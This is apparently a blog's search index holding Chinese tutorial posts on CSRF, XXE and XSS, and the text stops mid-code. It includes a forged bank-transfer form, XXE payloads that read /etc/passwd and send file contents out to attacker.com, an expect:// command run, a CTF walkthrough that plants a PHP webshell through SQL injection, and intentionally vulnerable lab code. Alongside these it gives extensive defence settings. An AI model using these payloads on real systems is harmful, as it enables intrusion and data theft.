<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>WOTOP10芝CSRF篇</title>
    <url>/2025/11/21/WOTOP10%E8%8A%9DCSRF%E7%AF%87/</url>
    <content><![CDATA[什么是CRSF

用官方的话来说：CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
用人话来说：CSRF就是利用恶意小网站来借用注册凭证伪装是你来访问目标网站并执行操作。看到这个说法是不是感觉和钓鱼很像，其实我很觉得。本质上CSRF就是一个钓鱼的操作。
在交流CSRF的过程，总绕不开两个经典问题：

CSRF和SSRF的区别是什么：
最根本的区别就是这两者的攻击对象，CSRF是用户对用户的攻击而SSRF是用户对服务器的攻击。

CSRF和XSS的利用注册凭证（cookie）的区别是什么：
两者都接触过的师傅们应该都清楚，无论是CSRF还是XSS都可以利用用户的cookie。但CSRF在使用更多的是依靠浏览器会存储cookie在再次访问页面时自带上cookie，所以在我们钓鱼的过程中会借用这个cookie；而XSS是直接获取cookie，我们想什么时候用就什么时候用，用“盗取‘这个词会不会形象点。


CSRF怎么用



GET方式

GET方式产生的CSRF存在两种方式，一种是一步到位的HTTP请求式，一种是需要用户再操作一步的href式。其实根本原理二者都一样，只是href式需要用户的配合。
HTTP请求式

一般来说，我们都会利用一张图片让用户在访问页面加载图片的时候自动发送一次HTTP请求。具体如下：
![](http://bank.com/withdraw/account=xiaoming&amp;amount=10000&amp;for=hacker)

用户如果已经登录了bank.com，在用户访问这个页面的时候我们就可以“借用”他的cookie并执行操作，将10000money转到hacker的账户下。（当然，前提是这些操作无需输入密码等其他操作才可以实现，一般来说没有这么呆的代码）
href式

href式的简单利用如下：
&lt;a href=&quot;http://bank.com/transfer?account_number_from=123456789&amp;account_number_to=987654321&amp;amount=100000&quot;&gt;View my Pictures!&lt;/a&gt;

所谓href自然不会自动触发，像上面这个我们所谓的多一步操作就是需要用户手动点击一下View my Pictures!，这里就需要一点小小的社工了，你需要用足够的吸引力勾引用户点击。
POST方式

现在的具体实现操作极少用GET方式实现的了，因为GET方式比较透明，多大都用POST，所以POST方式产生的CSRF也是我们更常用的。POST方式一般都是利用表单来传递参数，所以我们也可以用一个自动提交的表单来实现我们的目标：
&lt;form action=&quot;http://bank.com/withdraw&quot; method=POST&gt; 	&lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt; 	&lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt; 	&lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;

POST方式通常比GET方式要求更加严格一点，一是由于我们需要编写适合的表单，二也是因为POST方式是需要接口常用的方式，所以防护会更多，但也并不复杂。
如何防御CSRF

CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。
CSRF的两个特点是：

通常发生在第三方域名

“借用”用户的cookie


那我们就可以针对这两点来做防护

阻止不明外域的访问
同源检测
Samesite Cookie


提交时要求附加本域才能获取的信息
CSRF Token
双重Cookie验证



我们来详细展开一点talk about
限制同源——Samesite 

Samesite 是 Set-Cookie 的一种属性，它有三个值
Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
Set-Cookie: CookieName=CookieValue; SameSite=Strict;

Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。现代大多浏览器使用的就是这个。
Set-Cookie: CookieName=CookieValue; SameSite=Lax;

还有一种属性为 None，这种属性代表关闭了 SameSite
CSRF token

CSRF token可以誉为对CSRF近乎无敌的防御手法，下面来通俗易懂地解释一下CSRF token的工作原理。token在我们访问页面时就会产生，在用户这会存储，在服务端也会存储，我们每一次进行操作时，不仅需要检验身份验证还需要通过后端代码校验token的有效性——是否正确，在时间戳上是否有效，如果加密字符串一致且时间未过期，那么才可以通过校验进行操作，否则需要重新登录。
以 Java 为例，介绍一下 CSRF Token 服务端的校验逻辑
HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // 从 session 中得到 csrftoken 属性 String sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null) &#123; 	// 产生新的 token 放入 session 中 	sToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); &#125;else &#123; 	// 从 HTTP 头中取得 csrftoken 	String xhrToken = req.getHeader(“csrftoken”); 	// 从请求参数中取得 csrftoken 	String pToken = req.getParameter(“csrftoken”); 	if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; 		chain.doFilter(request, response); 	&#125;	else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; 		chain.doFilter(request, response); 	&#125;	else	&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); 	&#125; &#125;



绕过姿势

上面我们了解了一些防御手法，接下来就介绍一下防御姿势（大多防御姿势由PortSwigger中学习而来）
将POST修改为GET

CSRF Token 在 POST 请求当中生效，且业务点并非完全限制请求为 POST 请求，从而给了攻击者进行绕过的机会。

测试：将 CSRF Token 删掉，并将 HTTP 请求修改为 GET 请求。

删除 CSRF Token 进行绕过

有时候虽然设置了CSRF token，但并没有强验证 CSRF Token 的存在性。

测试：删除CSRF token发包测试

CSRF token未与用户session绑定

CSRF token未与用户session绑定就是说token并未与身份严格一一对应，就像登录，我们账号和密码并不是对应的。那么这时只需要一个正确的cookie和一个正确的token就可以，不需要这两者是绑定的。

测试：先修改 Cookie，再修改 CSRF Token，来观察 CSRF Token 与 Cookie 是否对应了，或者说是否绑定了。如果不是绑定的，我们可以尝试利用 Set-Cookie来输入一个cookie，这样我们就知道了cookie，然后再用一个我们已知的token。

Cookie 中的 CSRF 值与 CSRF Token 的值一致

只是将 CSRF Token 简单复制到 cookie 头中，然后仅验证两者是否一致。

测试：利用Set-Cookie设置一个假的csrf token，再将这个假的csrf token一起发送测试返回

CSRF Token和其他值绑定在一起

CSRF Token的值不是和session绑定在一起，而是和cookie中的其他值绑定在一起，这里用portswigger里的实验作为栗子：cookie中存在一个成为csrfkey的值，这个值与CSRF Token绑定在一起。但二者并没有与session绑定在一起也就是说没有与用户绑定在一起，我们可以尝试用已知用户的csrfkey和CSRF Token。

测试：
先用假的CSRF Token尝试一下，再试试其他已知用户的CSRF Token
再尝试用其他用户的CSRF Token和csrfkey



]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>从0到1了解XXE</title>
    <url>/2026/01/21/%E4%BB%8E0%E5%88%B01%E4%BA%86%E8%A7%A3XXE/</url>
    <content><![CDATA[一.什么是XXE漏洞

xxe漏洞是基于利用xml进行数据传输时，xml规范包含各种潜在危险功能。且xml可利用dtd定义外部实体，这可作为一个有效利用的点（但dtd逐渐被xml schema替代，后面要对其学习并转变利用）
顺便提一下JSON和XML都是用来传输数据的，为什么XXE是出现在XML中的，而没有出现在JSON中。其根本的原因就是XML和JSON两者对比最根本的区别是XML 是“可执行结构”，JSON 只是“数据结构”
二.XML介绍

2.1. XML基础

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。
2.2. 基本语法

XML 文档在开头有 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。
除了可选的开头外，XML 语法主要有以下的特性：

所有 XML 元素都须有关闭标签
XML 标签对大小写敏感
XML 必须正确地嵌套
XML 文档必须有根元素
XML 的属性值需要加引号

另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。
2.3.dtd

DTD（Document Type Definition，文档类型定义）是用于定义 XML 文档结构、元素、属性及实体的规范，属于 XML 1.0 规格的一部分。它通过定义一套标记规则，验证 XML 文档是否合法（有效），确保不同应用程序间交换数据的统一性和数据结构化。
DTD 的核心内容与功能：

结构约束：明确定义 XML 中可以使用哪些元素、元素间的关系（顺序、嵌套）以及属性定义。

合法性校验：XML 解析器通过 DTD 检查 XML 文档内容是否合乎规范，即验证其是否为“有效（Valid）”XML。

定义规则：DTD 包含了元素、属性、实体或符号的定义规则。


DTD 的分类：

内部 DTD：直接定义在 XML 文档内部的 &lt;!DOCTYPE&gt; 声明中。
外部 DTD：定义在独立的 .dtd 文件中，通过 &lt;!DOCTYPE&gt; 引入，支持多个 XML 文档共享。

2.4.实体

XML实体（XML Entity） 是XML文档中定义的命名数据片段，可以在文档中通过引用名称来重用。
实体可以分为外部实体和内部实体，但除了上面的分法，还可以分为通用实体和参数实体，我知道你很懵，但你先别懵，坚持住。
内部实体：

内部实体就是在dtd里面直接定义的实体
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ctf [    &lt;!ENTITY person &quot;ctfer&quot;&gt;    &lt;!ENTITY hello &quot; hello &amp;title;&quot;&gt;    &lt;!ENTITY word &quot;我要学ctf&quot;&gt;]&gt;&lt;ctf&gt;    &lt;publisher&gt;&amp;person;&lt;/publisher&gt;    &lt;rights&gt;&amp;hello;&lt;/rights&gt;    &lt;edition&gt;我们的口号是：&amp;word;&lt;/edition&gt;&lt;/ctf&gt;

上面的栗子呈现出来的结果如下
ctferhello ctfer我们的口号是：我要学ctf



外部实体

一般在XXE漏洞中利用的都是外部实体，因为外部实体其实就是引用外部文件内容作为数据。同时，也可以利用伪协议读取解析该xml的本地文件内容。（xml可以直接引用伪协议是因为当XML解析处理此类实体时，会尝试打开该URL以获得实体的值。如果XML解析器是用PHP实现的（例如PHP的DOMDocument或SimpleXML扩展），那么它会调用PHP的流处理函数，从而触发 php:// 流包装器的逻辑。当然，通用的ftp,data等伪协议一般xml的解析器都是可用的）
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE notice [    &lt;!ENTITY footer SYSTEM &quot;footer.xml&quot;&gt;    &lt;!ENTITY logo SYSTEM &quot;logo.svg&quot; NDATA svg&gt;]&gt;&lt;document&gt;    &lt;header&gt;公司公告&lt;/header&gt;    &lt;content&gt;这里是公告内容...&lt;/content&gt;    &amp;footer;  &lt;!-- 插入footer.xml文件内容 --&gt;&lt;/document&gt;



通用实体:

通用实体说白了就是可以直接在XML直接应用的实体，也就是我们可以在DTD外部直接利用&amp;引用的实体，其实上面外部实体和内部实体的例子都是通用实体，那这里就不再用代码讲述了，下面再讲讲参数实体我相信各位师傅就会区分了。
参数实体：

参数实体是仅可以用于dtd内部的实体，它的作用域只在dtd中，如果你在&lt;!DOCTYPE &gt;中使用将不会有任何反应，来个栗子：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE fortiguard [    &lt;!-- 1. 普通外部实体 --&gt;    &lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;        &lt;!-- 2. 参数实体（带base64编码） --&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;&gt;        &lt;!-- 3. 外部 DTD 引用 --&gt;    &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/abc.dtd&quot;&gt;        &lt;!-- 4. 执行外部 DTD --&gt;    %dtd;    %send;]&gt;

逻辑如下图：
三.XXE攻击

所谓XXE攻击就是利用xml语法自定义语句查询自己想要的信息。我们用一个最简单的栗子来讲解一下：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE notice [    &lt;!ENTITY footer SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;document&gt;    &amp;footer;  &lt;/document&gt;

可以直接读取/etc/passwd中的内容
下面来介绍一些XXE攻击方式
3.1. 拒绝服务攻击&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt;

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。
3.2. 文件读取&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt;



3.3. SSRF&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;/data&gt;



3.4. RCE&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;&lt;!-- expect伪协议 --&gt;expect:// 是 PHP 的一个 流包装器，由 expect 扩展提供。当 PHP 的文件操作函数（如 fopen(), file_get_contents()）处理一个以 expect:// 开头的 URI 时，它会执行 URI 中指定的命令，并返回命令的输出。




3.5. XIncludeXInclude攻击
有些应用程序接收客户端提交的数据，将其嵌入到服务器端的 XML 文档中，然后解析该文档。例如，当客户端提交的数据被放入后端 SOAP 请求中，并由后端 SOAP 服务进行处理时，就会发生这种情况。
在这种情况下，无法执行经典的 XXE 攻击，因为无法控制整个 XML 文档，因此无法定义或修改DOCTYPE元素。但是，或许可以使用子文档XInclude来代替。XInclude子文档是 XML 规范的一部分，它允许从子文档构建 XML 文档。可以将攻击XInclude植入 XML 文档中的任何数据值中，因此即使只能控制服务器端 XML 文档中的单个数据项，也可以执行攻击。
&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;



3.6.修改内容

XXE 通过修改内容类型发起攻击
大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如application/x-www-form-urlencoded。有些网站期望接收这种格式的请求，但也能容忍其他内容类型，包括 XML。
例如，如果一个普通的请求包含以下内容：
POST /action HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar

那么，您可以尝试提交以下请求，结果应该是一样的：
POST /action HTTP/1.0 Content-Type: text/xml Content-Length: 52 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;

如果应用程序容忍消息体中包含 XML 的请求，并将消息体内容解析为 XML，那么只需将请求重新格式化为 XML 格式，即可利用隐藏的 XXE 攻击面。
3.7.文件上传

某些应用程序允许用户上传文件，这些文件随后会在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式示例包括 DOCX 等办公文档格式和 SVG 等图像格式。
例如，某个应用程序可能允许用户上传图片，并在上传后在服务器上进行处理或验证。即使应用程序预期接收PNG或JPEG等格式的图片，其使用的图像处理库也可能支持SVG格式。由于SVG格式使用XML，攻击者可以提交恶意SVG图片，从而利用XXE漏洞的隐蔽攻击面。
我们借用DozerCTF2020的一道题目来讲解一下利用SVG文件上传实现XXE攻击：打开网页输入框可以输入URL的地址，然后进行检查URL指向的file是否为svg图片，SVG是基于XML的矢量图，可以支持Entity（实体）功能，这里未严格限制格式，因此造成blind xxe，ssrf打内网服务。先写一个简单的SVG图片源码放在vps上。
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE fortiguard [&lt;!ENTITY lab &quot;AAAA&quot;&gt;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;&lt;/svg&gt;

提交SVG图片源码地址发现实体成功显示，然后尝试读取历史操作的文件
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE fortiguard [&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;&lt;/svg&gt;

页面正常返回信息，但是经过尝试发现，并不能直接读到文件的内容，因为是无回显，所以进行尝试XXE的盲打，也通过加载外部的dtd文件，进而把读取结果以HTTP请求的方式发送到服务器上面进行读取，构造test.svg。
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE fortiguard [&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/abc.dtd&quot;&gt;%dtd;%send;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;&lt;/svg&gt;

继续构造abc.dtd
&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1/?%file;&#x27;&gt;&quot;&gt;%all;

这里将test.svg以及abc.dtd放进去vps上面，在网页提交test.svg的链接即可成功读取到.bash_history，可通过读取历史记录获取信息读取网页源码，然后利用SSRF打内网。首先利用sql注入写入一句话木马
http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23

然后进行读取flag文件
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;&gt;



3.8.绕过方式

1.过滤xml的证明即过滤&lt;?xml version=&quot;1.0&quot;根据 XML 1.0 和 1.1 规范，XML 声明是可选的。如果文档没有声明，解析器会采用默认值
(1)将双引号改换为单引号(2)在xml和version之间多加一个空格
2.无回显利用带外技术解决这个过程两个关键是读取本地文件，利用http请求携带参数数据发送给自己但我们并不能将这两个过程写在一个内部dtd中，如下：
&lt;!DOCTYPE foo [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY % send SYSTEM &quot;http://attacker.com/?%file;&quot;&gt;    %send;]&gt;


当解析器处理 &lt;!ENTITY % send SYSTEM &quot;http://attacker.com/?%file;&quot;&gt; 时，%file 是一个参数实体引用，但在实体定义中，参数实体引用不会立即展开。它只是作为字符串的一部分被保存下来。
当执行 %send; 时，解析器会将 %send 的替换文本（即 &quot;http://attacker.com/?%file;&quot;）插入到 DTD 中，但此时 %file 仍然是一个参数实体引用，需要再次展开。然而，%file 的值此时可能已经被定义，但展开时机可能不对，或者由于解析器对参数实体展开的顺序限制，导致最终 %send 请求的 URL 中仍然是 %file 的字面字符串，而不是其内容。

因此，会直接失败
我们就可以通过外部dtd嵌套一层实现我们想要的功能
evil.dtd:
&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://attacker.com/?%file;&#x27;&gt;&quot;&gt;%all;%send;

xml:
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [    &lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;    %dtd;]&gt;&lt;root/&gt;


%file：读取文件并存储其内容（如果是 PHP 环境，可能还需要 base64 编码以避免特殊字符）。
%all：其值是一个字符串：&quot;&lt;!ENTITY % send SYSTEM &#39;http://attacker.com/?%file;&#39;&gt;&quot;。注意这里使用了 % 来表示 %，这样在定义 %all 时，内部的 %file 不会被展开（因为它在字符串中）。
%all;：执行后，这个字符串被插入到 DTD 中，相当于定义了一个新的参数实体 %send，其 URI 中包含了 %file（此时 %file 已经被定义，但注意：在 %send 的定义中，%file 仍然是一个引用，不会立即展开）。
%send;：执行 %send 时，解析器会尝试展开它，而 URI 中的 %file 此时会被展开，从而得到包含文件内容的完整 URL，并向攻击者服务器发起请求。

四.防护

现代XML解析器通常默认禁用外部实体。
4.1.核心防御原则


禁用 DTD —— 最彻底的防御，因为外部实体依赖于 DTD。
禁用外部实体 —— 如果不能完全禁用 DTD，至少禁止加载外部实体。
使用安全的解析器配置 —— 大多数现代 XML 库提供安全配置选项。
输入验证与过滤 —— 对 XML 内容和结构进行白名单验证。
最小化 XML 使用 —— 优先使用 JSON 等更安全的格式。

4.2.各平台/语言的具体防护配置

4.2.1.Java

使用 DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();// 彻底禁用 DTDdbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);// 如果必须支持 DTD，则至少禁用外部实体dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);dbf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);// 禁用 XIncludedbf.setXIncludeAware(false);dbf.setExpandEntityReferences(false);// 设置安全处理dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);DocumentBuilder builder = dbf.newDocumentBuilder();



使用 SAXParser
SAXParserFactory spf = SAXParserFactory.newInstance();spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);spf.setXIncludeAware(false);SAXParser parser = spf.newSAXParser();



使用 XMLInputFactory (StAX)
XMLInputFactory factory = XMLInputFactory.newInstance();factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);



使用 XPath
XPathFactory xpf = XPathFactory.newInstance();xpf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);



4.2.2.PHP

PHP 使用 libxml2，可通过 libxml_disable_entity_loader() 控制实体加载。
// 禁用外部实体加载（包括本地文件）libxml_disable_entity_loader(true);// 使用 DOMDocument 安全解析$dom = new DOMDocument();$dom-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // 危险！不要使用这些选项// 正确方式：$dom-&gt;loadXML($xml, LIBXML_NONET); // 禁用网络访问// 或者使用 SimpleXML$previous = libxml_disable_entity_loader(true);$xmlObject = simplexml_load_string($xml);libxml_disable_entity_loader($previous);

注意：PHP 8.0 起 libxml_disable_entity_loader() 默认已为 true，但为了兼容性仍建议显式设置。
4.2.3.Python

Python 的 xml 库默认可能不安全，推荐使用 defusedxml。
使用 defusedxml（首选）
from defusedxml.ElementTree import parseet = parse(xml_file)  # 安全，自动阻止外部实体from defusedxml import minidomdoc = minidom.parse(xml_file)

若使用标准库，手动配置：
from xml.etree.ElementTree import XMLParser, parseparser = XMLParser()parser.entity = &#123;&#125;  # 清空实体字典，禁止外部实体# 或使用禁止DTD的解析器parser = XMLParser( forbid_dtd=True )



lxml 安全配置
from lxml import etreeparser = etree.XMLParser(    resolve_entities=False,   # 禁用实体解析    no_network=True,          # 禁用网络访问    load_dtd=False,           # 不加载DTD    dtd_validation=False      # 不进行DTD验证)tree = etree.parse(xml_file, parser)



4.2.4.NET (C#)

XmlReader 安全设置
XmlReaderSettings settings = new XmlReaderSettings();// 禁用 DTDsettings.DtdProcessing = DtdProcessing.Prohibit;// 或更严格的：如果必须支持DTD，则禁止外部实体settings.DtdProcessing = DtdProcessing.Parse;settings.MaxCharactersFromEntities = 1024;  // 限制实体扩展settings.XmlResolver = null;                 // 禁止解析外部资源using (XmlReader reader = XmlReader.Create(stream, settings))&#123;    XDocument doc = XDocument.Load(reader);&#125;



使用 XDocument &#x2F; XmlDocument 时
XmlDocument doc = new XmlDocument();doc.XmlResolver = null;  // 禁止外部资源解析doc.LoadXml(xmlString);


4.2.5.Node.js / JavaScript

使用 xml2js 或 xmldom 时手动防范
// xmldom 示例const &#123; DOMParser &#125; = require(&#x27;xmldom&#x27;);const parser = new DOMParser(&#123;    errorHandler: &#123; warning: () =&gt; &#123;&#125; &#125;,    locator: &#123;&#125;,    // 禁用外部实体    externalEntity: () =&gt; null&#125;);// 使用 fast-xml-parser（推荐）const parser = new XMLParser(&#123;    ignoreAttributes: false,    allowBooleanAttributes: true,    parseAttributeValue: true,    // 禁用外部实体    processEntities: false,    // 禁止 DTD    allowProtoParsing: false&#125;);

在浏览器端，同源策略通常限制外部实体，但仍需注意 XHR 响应解析。
4.2.6.Ruby

require &#x27;nokogiri&#x27;# 安全解析doc = Nokogiri::XML.parse(xml_string) do |config|  config.nonet   # 禁用网络连接  config.noent   # 禁用外部实体  config.dtdload # 禁止加载外部DTDend



4.3.输入验证与过滤

即使配置了解析器，也应对 XML 内容进行验证：

使用 XML Schema (XSD) 验证：确保 XML 符合预期的结构和数据类型，可以拒绝包含 DOCTYPE 的文档。
白名单校验：如果业务不需要 DTD，可以简单检查 XML 是否包含 &lt;!DOCTYPE 并拒绝。
内容长度限制：防止利用 XML 实体展开进行 DoS（如 Billion Laughs 攻击）。

示例：拒绝包含 DOCTYPE 的 XML
if &#x27;&lt;!DOCTYPE&#x27; in xml_string.upper():    raise ValueError(&quot;DOCTYPE not allowed&quot;)

但注意，攻击者可能通过编码绕过简单检测，因此应优先在解析器层面禁用。
参考链接：https://websec.readthedocs.io/zh/latest/vuln/xxe.htmlhttps://portswigger.net/web-security/xxe
https://www.freebuf.com/articles/web/330777.html
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章了解XSS</title>
    <url>/2026/01/14/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%BA%86%E8%A7%A3XSS/</url>
    <content><![CDATA[xss都快忘得差不多，赶快再来read一下，这次好好吃细点
原理


什么是xss呢？
xss全名Cross-site scripting，简单来说就是前端页面存在可写入风险，黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击  。
xss三种类型



反射型

反射型也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能攻击成功。
假设一个网页直接把用户参数输出到页面上
&lt;?php$input = $_GET[&#x27;param&#x27;];echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;&quot;;?&gt;

用户向 param 提交的数据会展示到 &lt;h1&gt; 的标签中展示出来，比如提交：hi xss

如果传&lt;script&gt;alert(&quot;hehe&quot;)&lt;/script&gt;

用户输入的 Script 脚本，已经被写入页面中，因为后端代码并未对输入进行过滤审查，网页会将js代码拼接进网页代码，并且执行
存储型

存储型 XSS 和反射型 XSS 的差别仅在于：提交的 XSS 代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS。
这边数据库搭建和后端编写都参考一下国光的
&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php/*数据库信息配置*/$host = &quot;localhost&quot;; //数据库地址$port = &quot;3306&quot;; //数据库端口$user = &quot;root&quot;; //数据库用户名$pwd = &quot;root&quot;; //数据库密码$dbname = &quot;xss&quot;; //数据库名$conn = new mysqli($host,$user,$pwd,$dbname,$port);?&gt;&lt;!-- 前端用户输入表单 --&gt;&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;&lt;form  method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php    /*直接将留言插入到数据库中*/    $username=$_POST[&#x27;username&#x27;];    $message=$_POST[&#x27;message&#x27;];    if($username and $message)    &#123;        $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$message&#125;&#x27;)&quot;;        if ($conn-&gt;query($sql) === TRUE) &#123;            echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;        &#125; else &#123;            echo 